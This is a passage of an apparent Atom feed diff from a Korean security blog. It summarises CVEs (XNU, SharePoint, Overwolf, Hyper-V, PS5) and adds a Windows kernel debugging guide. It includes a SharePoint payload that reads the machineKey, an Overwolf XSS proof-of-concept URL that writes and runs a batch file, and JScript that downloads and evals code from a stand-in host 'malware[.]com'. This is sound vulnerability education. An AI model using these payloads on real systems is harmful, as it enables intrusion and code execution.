함수가 실제로 사용하는 스택의 크기와 LLInt가 추적하는 크기가 서로 달라지게 되고 메모리 오염으로 이어집니다.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Fabu1ous</tag>
+      
+      <tag>cve</tag>
+      
+      <tag>safari</tag>
+      
+      <tag>wasm</tag>
+      
+      <tag>int overflow</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] CVE-2021-30660: macOS 및 iOS의 커널 메모리 유출 취약점</title>
+    <link href="/2021/06/04/l0ch/2021-06-04/"/>
+    <url>/2021/06/04/l0ch/2021-06-04/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://alexplaskett.github.io/CVE-2021-30660/">CVE-2021-30660 - XNU Kernel Memory Disclosure</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li><a href="https://support.apple.com/en-us/HT212325">macOS 11.3 이전 release</a></li><li><a href="https://support.apple.com/en-us/HT212317">iOS 14.5 이전 release</a></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apple사의 macOS 및 iOS의 XNU 시스템에서 커널 메모리를 유출할 수 있는 취약점이 발견되어 세부 정보가 공개되었습니다.</p><p>XNU의 syscall <code>SYS_msgsnd_nocancel</code> 의 핸들러인 <a href="https://opensource.apple.com/source/xnu/xnu-1504.7.4/bsd/kern/sysv_msg.c.auto.html">sysv_msg.c/msgrcv_nocancel()</a> 는 유저 공간의 메시지 크기를 <code>msgsz</code>로 받습니다. 만약 유저 공간에서 요청된 크기가 초기에 커널에 전송된 크기 <code>msghdr→msg_ts</code>보다 크면 아래와 같이 <code>msghdr→msg_ts</code>로 자릅니다.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> (msgsz &gt; msghdr-&gt;msg_ts) &#123;msgsz = msghdr-&gt;msg_ts;&#125;</code></pre><p>이후 아래의 반복문을 돌며 커널 <code>msgpool</code>의 데이터를 유저 공간으로 복사합니다.</p><pre><code class="hljs c"><span class="hljs-number">1</span><span class="hljs-comment">// msg.h</span><span class="hljs-number">2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MSGSSZ8<span class="hljs-comment">/* Each segment must be 2^N long */</span></span><span class="hljs-number">3</span><span class="hljs-number">4</span><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">msginit</span><span class="hljs-params">(__unused <span class="hljs-keyword">void</span> *dummy)</span></span>&#123;<span class="hljs-number">5</span><span class="hljs-keyword">if</span> (i != msginfo.msgssz) &#123;<span class="hljs-number">6</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;msginfo.msgssz=%d (0x%x) not a small power of 2; resetting to %d\\n&quot;</span>, msginfo.msgssz, msginfo.msgssz, MSGSSZ); <span class="hljs-number">7</span>msginfo.msgssz = MSGSSZ;<span class="hljs-number">8</span>&#125;<span class="hljs-number">9</span>...<span class="hljs-number">10</span><span class="hljs-number">11</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">msgsnd_nocancel</span><span class="hljs-params">(struct proc *p, struct msgsnd_nocancel_args *uap, <span class="hljs-keyword">int32_t</span> *retval)</span></span>&#123;<span class="hljs-number">12</span>...<span class="hljs-number">13</span><span class="hljs-keyword">for</span> (len = <span class="hljs-number">0</span>; len &lt; msgsz; len += msginfo.msgssz) &#123;<span class="hljs-number">14</span><span class="hljs-keyword">size_t</span> tlen;<span class="hljs-number">15</span><span class="hljs-comment">/* compare input (size_t) value against restrict (int) value */</span><span class="hljs-number">16</span><span class="hljs-keyword">if</span> (msgsz &gt; (<span class="hljs-keyword">size_t</span>)msginfo.msgssz) &#123;<span class="hljs-number">17</span>tlen = msginfo.msgssz;<span class="hljs-number">18</span>&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-number">19</span>tlen = msgsz;<span class="hljs-number">20</span>&#125;<span class="hljs-number">21</span><span class="hljs-keyword">if</span> (next &lt;= <span class="hljs-number">-1</span>) &#123;<span class="hljs-number">22</span>panic(<span class="hljs-string">&quot;next too low #3&quot;</span>);<span class="hljs-number">23</span>&#125;<span class="hljs-number">24</span><span class="hljs-keyword">if</span> (next &gt;= msginfo.msgseg) &#123;<span class="hljs-number">25</span>panic(<span class="hljs-string">&quot;next out of range #3&quot;</span>);<span class="hljs-number">26</span>&#125;<span class="hljs-number">27</span>SYSV_MSG_SUBSYS_UNLOCK();<span class="hljs-number">28</span>eval = copyout(&amp;msgpool[next * msginfo.msgssz], user_msgp, tlen);<span class="hljs-number">29</span>...</code></pre><p>반복문의 증가 값인 <code>msginfo.msgssz</code>는 <code>msginit()</code>에서 <code>#define MSGSSZ 8</code> 로 선언된 <code>MSGSSZ</code>로 초기화되어 특정 조건을 만족하면 <code>8 bytes</code> 단위로 커널 메모리를 유저 공간에 복사하는데, 이때 요청된 크기가 8의 배수가 아닐 경우 초기화되지 않은 <code>1~7 bytes</code> 크기의 커널 메모리가 유출될 수 있습니다.</p><p><code>9 bytes</code> 크기의 <code>SYS_msgsnd_nocancel</code> syscall을 보낼 경우 취약점은 다음과 같이 트리거 됩니다.</p><ol><li><code>msghdr→msg_ts</code>와 <code>msgsz</code>가 9로 설정됩니다.</li><li>line 16의 조건문에 의해  <code>tlen</code>이 8이 됩니다.</li><li><code> 8 bytes</code> 단위로 복사하는 반복문을 두 번 수행합니다.</li><li><code>16 bytes</code>의 커널 메모리가 유저 공간으로 복사되어 초기화되지 않은 <code>7 bytes</code> 크기의 커널 메모리가 유출됩니다.</li></ol>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>cve</tag>
+      
+      <tag>kernel</tag>
+      
+      <tag>ios</tag>
+      
+      <tag>information disclosure</tag>
+      
+      <tag>L0ch</tag>
+      
+      <tag>apple</tag>
+      
+      <tag>macos</tag>
+      
+      <tag>xnu</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] CVE-2021-31181: Microsoft SharePoint 원격 코드 실행 취약점</title>
+    <link href="/2021/06/03/idioth/2021-06-03/"/>
+    <url>/2021/06/03/idioth/2021-06-03/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability">CVE-2021-31181: MICROSOFT SHAREPOINT WEBPART INTERPRETATION CONFLICT REMOTE CODE EXECUTION VULNERABILITY</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2021년 5월 11일 릴리스 이전 버전의 Microsoft SharePoint<ul><li>Foundation 2013 Service Pack 1</li><li>Server 2019</li><li>Enterprise Server 2016</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft SharePoint에서 인증된 사용자가 SharePoint의 웹 애플리케이션의 서비스 계정 context에서 임의 코드를 실행할 수 있는 취약점이 발견되어 5월에 패치되었습니다.</p><p>해당 취약점은 <code>EditingPageParser.VerifyControlOnSafeList()</code> 메소드에서 사용자 입력 값 검증 미흡으로 발생합니다. 이 메소드는 unsafe controls 리스트와 사용자의 입력 값을 비교하여 확인하며 <code>web.config</code>에 지정된 <code>SafeControl</code>에 의해 안전한 컨트롤이 없는 경우 예외를 발생시킵니다.</p><p>하지만 검사를 우회하는 방법이 존재합니다. <code>EditingPageParser.ParseStringInternal()</code>은 사용자 입력 값(<code>dscXml</code>)을 구문 분석하고 <code>hashtable</code>을 Register directive 정보로 채운 다음 서버 컨트롤을 나타내는 태그로 <code>hashtable2</code>를 채웁니다. 그 후 <code>hashtable2</code>의 각 요소에 대해 <code>Type</code> 객체를 생성하고 <code>SafeControls</code>의 allowed list와 비교하여 확인합니다. 하지만 <code>Type</code>을 확인할 수 없을 때 서버 컨트롤 태그가 무시됩니다. 이를 통해 <code>WebPartPagesWebService.RenderWebPartForEdit</code> 웹 API 메소드로 <code>/_vti_bin/webPartPages.asmx</code> 엔드포인트를 통해 접근할 수 있습니다. <code>aspx</code>를 입력 값으로 사용하여 <code>EditPageParser.VerifyControlOnSafeList</code>를 사용해 확인 후 unsafe element가 없으면 디자인 모드에서 마크업을 처리합니다. 이때 <code>RenderWebPartForEdit</code>의 request는 다음과 같습니다.</p><pre><code class="hljs dust"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">%@</span> <span class="hljs-attr">Register</span> <span class="hljs-attr">TagPrefix</span>=<span class="hljs-string">&quot;WebPartPages&quot;</span> <span class="hljs-attr">Namespace</span>=<span class="hljs-string">&quot;Microsoft.SharePoint.WebPartPage&quot;</span> <span class="hljs-attr">Assembly</span>=<span class="hljs-string">&quot;Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c&quot;</span> %&gt;</span> </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">%@Register</span> <span class="hljs-attr">TagPrefix</span>=<span class="hljs-string">&quot;att&quot;</span> <span class="hljs-attr">Namespace</span>=<span class="hljs-string">&quot;System.Web.UI.WebControls &quot;</span> <span class="hljs-attr">Assembly</span>=<span class="hljs-string">&quot;System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;</span>%&gt;</span> </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">WebPartPages:XsltListFormWebPart</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;id01&quot;</span> <span class="hljs-attr">runat</span>=<span class="hljs-string">&quot;server&quot;</span> <span class="hljs-attr">ListDisplayName</span>=<span class="hljs-string">&quot;Documents&quot;</span> <span class="hljs-attr">WebId</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">&#123;6e7040c8-0338-4448-914d-a7061e0fc347&#125;</span><span class="xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span> </span><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">DataSources</span>&gt;</span> </span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">att:xmldatasource</span> <span class="hljs-attr">runat</span>=<span class="hljs-string">&quot;server&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;XDS1&quot;</span> </span></span><span class="xml">      XPath=&quot;/configuration/system.web/machineKey&quot; </span><span class="xml">      datafile=&quot;c:/inetpub/wwwroot/wss/VirtualDirectories/80/web.config&quot; /&gt; </span><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">DataSources</span>&gt;</span> </span><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">xsl</span>&gt;</span> </span><span class="xml">      <span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;2.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span>          </span><span class="xml">          <span class="hljs-tag">&lt;<span class="hljs-name">xsl:output</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;xml&quot;</span> <span class="hljs-attr">indent</span>=<span class="hljs-string">&quot;yes&quot;</span>/&gt;</span> </span><span class="xml">          <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span> &gt;</span> </span><span class="xml">          <span class="hljs-tag">&lt;<span class="hljs-name">xsl:copy-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;.&quot;</span>/&gt;</span> </span><span class="xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span> </span><span class="xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span> </span><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">xsl</span>&gt;</span> </span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">WebPartPages:XsltListFormWebPart</span>&gt;</span></span></code></pre><p>따라서 <code>web.config</code>의 machinekey section을 사용하여 서버에서 <code>ViewState</code>가 deserialize 될 때 임의의 OS 명령을 실행하는 <code>VIEWSTATE</code> 파라미터를 생성할 수 있습니다.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>cve</tag>
+      
+      <tag>rce</tag>
+      
+      <tag>microsoft</tag>
+      
+      <tag>idioth</tag>
+      
+      <tag>sharepoint</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] CVE-2021-33501: Overwolf 1-Click Remote Code Execution</title>
+    <link href="/2021/06/02/fabu1ous/2021-06-02/"/>
+    <url>/2021/06/02/fabu1ous/2021-06-02/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swordbytes.com/blog/security-advisory-overwolf-1-click-remote-code-execution-cve-2021-33501/">Overwolf 1-Click Remote Code Execution</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Overwolf Client 0.169.0.22</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Overwolf는 PC 게임을 위한 확장 프로그램의 개발 프래임워크를 제공하고 유통하는 플랫폼입니다. Overwolf Store의 URL handler에 Reflected Cross-Site Scripting(XSS)을 이용한 원격 코드 실행 취약점이 발견되었습니다. </p><pre><code class="hljs url">overwolfstore:&#x2F;&#x2F;app&#x2F;apps&#x2F;&lt;img src&#x3D;x onerror&#x3D;alert(document.location)&gt;&#x2F;4</code></pre><p><code>overwolfstore://</code> Custum Scheme를 사용하면 웹브라우저를 통해 OverwolfAppstore.exe 프로세스를 실행할 수 있습니다. URL의 category에 해당하는 부분이 오류 메세지의 일부로 responce body에 reflect 되며 Overwolf Store UI의 DOM에 reflect 되므로 XSS 공격이 가능합니다.</p><pre><code class="hljs url">overwolfstore:&#x2F;&#x2F;app&#x2F;apps&#x2F;&lt;img+src&#x3D;x+onerror&#x3D;%22overwolf.io.writeFileContents(&#39;C:\\windows\\temp\\d.bat&#39;,&#39;start%20cmd%20%252fk%20whoami&#39;,&#39;&#39;,false,console.log)%2526overwolf.utils.openUrlInDefaultBrowser(&#39;C:\\windows\\temp\\d.bat&#39;)%22&gt;&#x2F;CCCCCC</code></pre><p>위는 PoC 코드로 다음과 같은 작업을 합니다.</p><ol><li>누군가 악성 URL에 접속하면 Overwolf Store 응용프로그램이 실행되고 XSS 취약점 트리거.</li><li><code>C:\windows\temp\</code> 폴더에 악성 batch 파일 생성.</li><li>batch 파일 실행</li></ol>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Fabu1ous</tag>
+      
+      <tag>cve</tag>
+      
+      <tag>rce</tag>
+      
+      <tag>xss</tag>
+      
+      <tag>sandbox escape</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] CVE-2021-28476: Microsoft Hyper-V의 Guest-to-Host RCE 취약점</title>
+    <link href="/2021/06/01/l0ch/2021-06-01/"/>
+    <url>/2021/06/01/l0ch/2021-06-01/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/0vercl0k/CVE-2021-28476">CVE-2021-28476: a guest-to-host “Microsoft Hyper-V Remote Code Execution Vulnerability” in vmswitch.sys.</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft Hyper-V</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft의 하이퍼바이저 기반 가상화 시스템인 Hyper-V에서 게스트 머신이 호스트 머신으로 escape 해 원격 코드 실행이 가능한 취약점이 발견되어 세부 정보가 공개되었습니다.</p><p>취약점은 호스트 머신의 <code>vmswitch.sys</code> 드라이버에 존재합니다. <code>vmswitch.sys</code>는 가상 파티션이 존재하는 시스템에서 파티션 간 통신에 사용되는 채널 기반 통신 메커니즘인 <a href="https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/reference/hyper-v-architecture">VMBus</a> 기능을 지원합니다. <code>vmswitch.sys</code>의 <code>VmsIfrInfoParams_OID_SWITCH_NIC_REQUEST</code> 함수에서는 원격 <a href="https://docs.microsoft.com/ko-kr/windows-hardware/drivers/network/remote-ndis--rndis-2">NDIS(RNDIS)</a>  요청을 처리하는데, 게스트 머신에서 악성 RNDIS 요청을 보내 해커가 제어하는 데이터로 호출이 가능하고 이를 이용해 호스트 머신이 게스트 머신의 포인터를 역참조 하도록 합니다.</p><p>해커는 Hyper-V에 Ubuntu focal 게스트 머신을 생성한 뒤 해당 취약점을 악용해 원격 코드 실행을 트리거할 수 있습니다.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>cve</tag>
+      
+      <tag>rce</tag>
+      
+      <tag>microsoft</tag>
+      
+      <tag>L0ch</tag>
+      
+      <tag>hyper-v</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] COM 객체를 활용한 백도어</title>
+    <link href="/2021/05/31/idioth/2021-05-31/"/>
+    <url>/2021/05/31/idioth/2021-05-31/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/maltrak/com-objects-p-1-the-hidden-backdoor-in-your-system-947ac4285e85">COM Objects P.1: The Hidden Backdoor in Your System</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>지난 몇 년간, 해커들은 COM Object을 통해 fileless attack, defense 우회, 화이트리스트를 우회하고 RPC 프로토콜을 사용하여 내부에 침투하기도 했습니다. 해커들이 COM 객체를 통해 공격을 진행하는 방법은 다음과 같습니다.</p><p>먼저 Initial Access를 위한 COM 객체를 생성합니다. 내부 네트워크에 접근하기 위해서 페이로드를 전송할 수 있어야 합니다. COM Scriptlet을 통해 악성 자바스크립트나 VBScript를 다운로드하고 실행할 수 있습니다.</p><p>COM을 활용하여 악성 스크립트를 다운로드하고 실행하는 Scriptlet 코드는 다음과 같이 구성됩니다. 첫번째로 Shell에 접근합니다.</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;JScript&quot;</span>&gt;</span>&lt;![CDATA[<span class="javascript"><span class="hljs-keyword">var</span> malware = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;WScript.Shell&quot;</span>).Run(<span class="hljs-string">&quot;powershell.exe ...&quot;</span>);</span>]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p><code>ActiveXObject</code>를 통해 <code>WScript.Shell</code>을 호출하여 명령을 실행할 수 있습니다.  그 다음 네트워크 통신을 통해 악성 스크립트 파일을 다운로드하고 실행합니다.</p><pre><code class="hljs js">net = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>);net.Open(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;http://malware[.]com/malware.js&quot;</span>, <span class="hljs-literal">false</span>);net.Send();js = net.ResponseText;<span class="hljs-built_in">eval</span>(js);</code></pre><p>.NET의 Serialization을 활용하여 위의 작업을 수행할 수 있습니다. <code>System.Runtime.Serialization.Formatters.Binary.BinaryFormatters</code>를 <code>ActiveXObject</code>로 호출하면 객체를 base64로 인코딩할 수 있고 메모리에서 디코딩되어 메인 코드를 실행할 수 있습니다. 이는 <a href="https://github.com/tyranid/DotNetToJScript">DotNetToJScript</a>를 통해 쉽게 활용할 수 있습니다.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>windows</tag>
+      
+      <tag>backdoor</tag>
+      
+      <tag>idioth</tag>
+      
+      <tag>malware</tag>
+      
+      <tag>com</tag>
+      
+      <tag>vbscript</tag>
+      
+      <tag>jscript</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[Research] 공대오빠가 알려주는 Windows Driver Part 1 - Setting Up Kernel Debugging</title>
+    <link href="/2021/05/30/l0ch/windows-driver/"/>
+    <url>/2021/05/30/l0ch/windows-driver/</url>
+    
+    <content type="html"><![CDATA[<h1 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h1><p>안녕하세요! L0ch입니다. 지난번 pwn cool sexy 시리즈에 이어 새로운 시리즈로 돌아왔습니다!  그 사이에 기말고사 기간이 된 건 덤.. </p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%201.png" alt="windows-driver/Untitled%201.png"></p><blockquote><p>과거의 나야.. 너 기말도 망했어</p></blockquote><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%202.png" alt="windows-driver/Untitled%202.png"></p><p>교수님 종강좀요ㅠㅠㅠ</p><p>이번 시리즈에서는 하루한줄을 보다 보면 꽤 자주 나오는 Windows third-party driver의 권한상승 취약점을 다룰 예정입니다! </p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%203.png" alt="windows-driver/Untitled%203.png"></p><blockquote><p>이 드라이버 아님ㅎㅎ;</p></blockquote><p>예시를 하나 들어보자면.. 최근 이슈가 된 Dell의 BIOS 업데이트에 사용되는 드라이버에서 나온 <a href="https://hackyboiz.github.io/2021/05/07/l0ch/2021-05-07/">[하루한줄] CVE-2021-21551: 수억 대의 Dell PC에 영향을 주는 권한 상승 취약점 </a> 정도가 있겠네요. 대충 심각한 취약점인건 알겠는데 IOCTL은 뭐고… <code>EPROCESS</code>? 토큰을 어떻게 덮어 쓴다는 건지 또 권한상승은 어떻게 한다는 건지.. 정말 모르는 용어, 개념 투성이네요. 공부할게 너무 많지만 ㅠㅠㅠ 하나씩 공부하다보면 언젠가는 드라이버 취약점을 찾을수도 있겠죠?</p><p>오늘은 시리즈 첫 글이니 가볍게 디버깅 환경 세팅으로 시작해서 앞으로 간단한 exploit 예제를 다루고, one-day 분석하는 것을 끝으로 마무리하려고 합니다. 이번 시리즈도 길어질 것 같은 예감이 드는 건.. 기분 탓인가..?</p><h1 id="준비"><a href="#준비" class="headerlink" title="준비"></a>준비</h1><p>우선 디버깅 세팅부터 해야 합니다. 커널 디버깅은 유저 모드 애플리케이션과 달리 로컬에서 디버깅할 수 없습니다. 완전히 불가능한 것은 아니지만 제약사항이 많죠. 그래서! 보통은 원격지 PC를 하나 구성해 디버거를 세팅합니다.</p><p>이전에는 named pipe를 사용해 가상 시리얼 포트로 커널 디버깅을 했지만 시리얼 포트 속도의 한계로 KDNET 네트워크 디버깅을 사용하며 필요한 준비는 아래와 같습니다.</p><p><strong>1. 호스트 Windows와 VMware or Hyper-V의 게스트 Windows</strong></p><p>Windbg를 사용해 커널을 분석할 것이기 때문에 분석대상이 되는 디버기 Windows와 분석을 진행할 Windows가 각각 필요합니다. 호스트가 Windows 환경이면 게스트 Windows VM 하나만 올리면 됩니다. </p><p><img src="/2021/05/30/l0ch/windows-driver/tempsnip.png" alt="windows-driver/tempsnip.png"></p><blockquote><p>?</p></blockquote><p>네 저는 맥을 사용하기 때문에…..  Windows VM 두개를 올려서 진행했습니다. </p><p>네? 어디서 뭐가 돌아가는 소리 안나냐구요?</p><p>.</p><p>.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%204.png" alt="windows-driver/Untitled%204.png"></p><blockquote><p>이륙한드아아ㅏㅏ !!!</p></blockquote><p>맥이 잘 버텨주고 있으니 다행이네요 ㅎㅎ 아님말고<br>글에서는 편의상 호스트 OS가 Windows라고 가정하고 분석할 디버기 Windows를 게스트라고 부르겠습니다! </p><p><strong>2. 블루스크린을 친구처럼 생각하는 강인한 멘탈(?)</strong></p><p>사실 취약점 찾는 입장에서 블루스크린은 곧 크래시기 때문에 블루스크린을 본다면 개이득이죠ㅋㅋ  </p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%205.png" alt="windows-driver/Untitled%205.png"></p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%206.png" alt="windows-driver/Untitled%206.png"></p><blockquote><p>편안-</p></blockquote><p>멘탈까지 준비가 모두 되었다? 바로 디버깅 세팅으로 고고고</p><h1 id="Setting-Up-Debugging"><a href="#Setting-Up-Debugging" class="headerlink" title="Setting Up Debugging"></a>Setting Up Debugging</h1><p>먼저 게스트와 호스트 Windows에 <a href="https://docs.microsoft.com/ko-kr/windows-hardware/drivers/debugger/debugger-download-tools">Windbg</a>를 설치합니다. 호스트 Windows에는 Windbg Preview를 설치해 사용해도 되지만 Windbg Preview는 kdnet이 없기 때문에 게스트 Windows에는 Windbg를 SDK로 설치해야 합니다!</p><p><img src="/2021/05/30/l0ch/windows-driver/tempsnip%201.png" alt="windows-driver/tempsnip%201.png"></p><p>Windbg 설치를 끝냈으면 게스트 VM 설정→Network Adapter에서 Network connection을 Bridged로 설정해 호스트와 통신할 수 있게 설정한 뒤 통신이 잘 되는지 테스트를 해봅니다.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%207.png" alt="windows-driver/Untitled%207.png"></p><p>핑 테스트 할 때는 호스트와 게스트 모두 방화벽에서 ICMP 인바운드 허용하는 것 잊지 마세요!</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%208.png" alt="windows-driver/Untitled%208.png"></p><p>정상적으로 통신이 되는 걸 확인했으면 호스트의 host name을 확인합니다.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%209.png" alt="windows-driver/Untitled%209.png"></p><p>게스트에서 cmd를 관리자 권한으로 실행해 다음과 같이 <code>kdnet.exe</code>을 실행합니다. 이때 포트는 50000 ~ 50039 범위 안에서 줍니다.</p><pre><code class="hljs angelscript">&gt; kdnet.exe &lt;host name&gt; <span class="hljs-number">50001</span></code></pre><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%2010.png" alt="windows-driver/Untitled%2010.png"></p><p>해당 머신을 디버깅하기 위해 커맨드를 호스트 머신에서 실행하라고 하네요! 빨간 박스의 커맨드를 복사해놓습니다.</p><p>이제 호스트의 Windbg Preview를 실행하고 Start debugging → Attach to Kernel → Net 에서 포트와 커맨드를 입력합니다.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%2011.png" alt="windows-driver/Untitled%2011.png"></p><p>OK를 눌러 Windbg Preview가 대기 상태가 되면 게스트를 <code>shutdown -r -t 0</code> 으로 재부팅해줍니다. </p><p>재부팅하면..!</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%2012.png" alt="windows-driver/Untitled%2012.png"></p><p>잘 붙은 것 같죠? 디버기 머신인 게스트 Windows도 확인해볼게요.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%2013.png" alt="windows-driver/Untitled%2013.png"></p><p>디버거가 붙은 상태에서 부팅되면 우측 하단에 테스트 모드와 빌드 버전 정보가 표시되는 것을 확인할 수 있습니다. </p><p>다음 파트부터는 본격적으로 Windows의 third-party driver와 취약점, one-day 분석까지 알아보도록 하겠습니다 ㅎㅎ</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Research</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>windows</tag>
+      
+      <tag>kernel</tag>
+      
+      <tag>L0ch</tag>
+      
+      <tag>research</tag>
+      
+      <tag>windows driver</tag>
+      
+      <tag>debugging</tag>
+      
+      <tag>kernel debugging</tag>
+      
+      <tag>third-party driver exploitation</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] CVE-2021-29628 : PlayStation5 SMAP Bypass</title>
+    <link href="/2021/05/30/j0ker/2021-05-30/"/>
+    <url>/2021/05/30/j0ker/2021-05-30/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/1048322">SMAP bypass(PS5)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>PlayStation5, FreeBSD 12</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>SMAP(Supervisor-Mode Access Prevention)은 커널에서 유저랜드 메모리에 접근하지 못하게 하여 취약점 익스플로잇을 어렵게 하는 커널 레벨 보호기법입니다.</p><p>PlayStation 5(이하 PS5)는 FreeBSD 12 기반으로 개발된 운영체제인 Orbis 2.0을 사용합니다. CVE-2021-29628은 FreeBSD 12에서 발견됐었던 취약점이지만, PS5에서 이 취약점에 대해 패치를 하지 않아 PS5에서 SMAP를 bypass할 수 있었습니다.</p><p>PS5에서 SMAP가 활성화되어 있는 상태(<code>Rflags</code>의 <code>Alignment Check Flag</code>, <code>%RFLAGS.AC</code>가 세팅되지 않은 상태)에서 커널에서 유저 페이지에 접근하면 page fault가 발생합니다. 반면에 <code>%RFLAGS.AC</code>가 세팅되지 않은 상태에서는 커널에서 정상적으로 유저 페이지에 접근이 가능합니다. 하지만 FreeBSD 커널에서는 <code>copyin()</code>과 